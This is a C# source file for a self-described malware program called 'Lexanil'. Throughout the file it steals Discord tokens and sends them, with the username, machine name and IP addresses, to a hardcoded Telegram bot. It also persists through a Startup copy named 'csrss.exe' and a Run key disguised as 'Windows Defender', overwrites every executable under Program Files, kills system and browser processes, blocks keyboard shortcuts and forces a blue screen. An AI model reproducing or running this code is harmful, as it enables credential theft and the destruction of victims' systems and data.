using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Net.Sockets;
using Microsoft.Win32;

using static Lexanil.NativeMethods;
using System.Reflection;
using System.Text;

namespace Lexanil
{
    public static class NativeMethods
    {
        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        #region Kernel32
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string name);
        #endregion

        #region Ntdll
        [DllImport("ntdll.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
        #endregion

        #region User32
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int ShowCursor(bool bShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool UnhookWindowsHookEx(IntPtr hook);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern short GetAsyncKeyState(Keys key);
        #endregion
    }

    public static class Paths
    {
        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static readonly string ProgramFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        public static readonly string ProgramFilesX86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
        public static readonly string Startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        public static readonly string Lxnl = Path.Combine(AppData, ".lxnl");
        public static readonly string OurAppPath = Assembly.GetExecutingAssembly().Location;
        
    }

    public partial class MainWindow : Form
    {
        private static string[] processes = new[] { "iexplore", "steam", "explorer", "taskmgr", "procmon", "procmon64", "cmd", "discord", "chrome", "firefox" };

        private IntPtr ptrHook;
        private LowLevelKeyboardProc objKeyboardProcess;
        private bool foundSth = true;

        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public Keys key;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr extra;
        }

        public MainWindow()
        {
            InitializeComponent();
        }

        private void MainWindow_Load(object sender, EventArgs e)
        {
            //broadcastInfection(); 
            //disableShortcuts();
            //ShowCursor(false);
            //startupInfect();
            //infectFiles();
           // prockilltmr.Start();
        }

        private void prockilltmr_Tick(object sender, EventArgs e)
        {
            foreach (Process proc in Process.GetProcesses())
            {

                if (processes.Contains(proc.ProcessName))
                {
                    try
                    {
                        proc.Kill();
                    }
                    catch (Exception) { }

                }
            }
        }

        private bool HasAltModifier(int flags)
        {
            return (flags & 0x20) == 0x20;
        }

        private void startupInfect()
        {
            try
            {
                if (File.Exists(Paths.Lxnl))
                {
                    File.Copy(Paths.OurAppPath, Path.Combine(Paths.Startup, "csrss.exe"));
                    var rWrite = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                    rWrite.SetValue("Windows Defender", Paths.OurAppPath);
                }
                else
                {
                    var text = $"Hello {Environment.UserName} Your PC has been infected by Lexanil, a new type of malware which has already stolen your data and published on the internet, good luck and thanks for the data!";
                    File.WriteAllText(Paths.Lxnl, Convert.ToBase64String(Encoding.UTF8.GetBytes(text)));
                    broadcastInfection();
                    bsod();
                }
            }
            catch (Exception)
            {

            }
        }

        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));


                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab && HasAltModifier(objKeyInfo.flags) || objKeyInfo.key == Keys.Escape && (ModifierKeys & Keys.Control) == Keys.Control)
                {
                    return (IntPtr)1;
                }
            }
            return CallNextHookEx(ptrHook, nCode, wp, lp);
        }

        private void bsod()
        {
            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }

        private void infectFiles()
        {
            var path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            var curfilename = AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName;
            try
            {
                foreach (string file in Directory.GetFiles(path, "*.exe", SearchOption.AllDirectories))
                {
                    File.Copy(curfilename, file, true);
                }
            }
            catch (Exception)
            {

            }
        }

        private void disableShortcuts() 
        {
            ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule;
            objKeyboardProcess = new LowLevelKeyboardProc(captureKey);
            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0);
        }

        private string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return null;
        }

        private string GetPublicIPAddress() 
        {
            string ip = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return ip;
        }

        private void broadcastInfection()
        {
            string url = $"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=1466869929&text=" +
                $"😈 {AppDomain.CurrentDomain.FriendlyName}(Lexanil™) Has infected Someone, I'm sending you his details! 😈\n" +
                $"User Name: {Environment.UserName}\n" +
                $"Machine Name: {Environment.MachineName}\n" +
                $"LocalIP: {GetLocalIPAddress()}\n" +
                $"PublicIP: {GetPublicIPAddress()}\n" +
                $"Discord Tokens: {string.Join("\n", getDiscordTokens())}";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream resStream = response.GetResponseStream();
        }

        private List<string> getDiscordTokens()
        {
            List<string> captures = new List<string>();
            DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");

            foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
            {
                string openedfile = file.OpenText().ReadToEnd();

                foreach (Match match in Regex.Matches(openedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    captures.Add(match.Value + "\n");

                foreach (Match match in Regex.Matches(openedfile, @"mfa\.[\w-]{84}"))
                    captures.Add(match.Value + "\n");
            }


            captures = captures.ToList();

            Console.WriteLine(captures);

            if (captures.Count > 0)
            {
                foundSth = true;
            }
            else
                captures.Add("Empty");

            return captures;
        }

        private void MainWindow_Closing(object sender, FormClosingEventArgs args) => args.Cancel = true;
    }
}

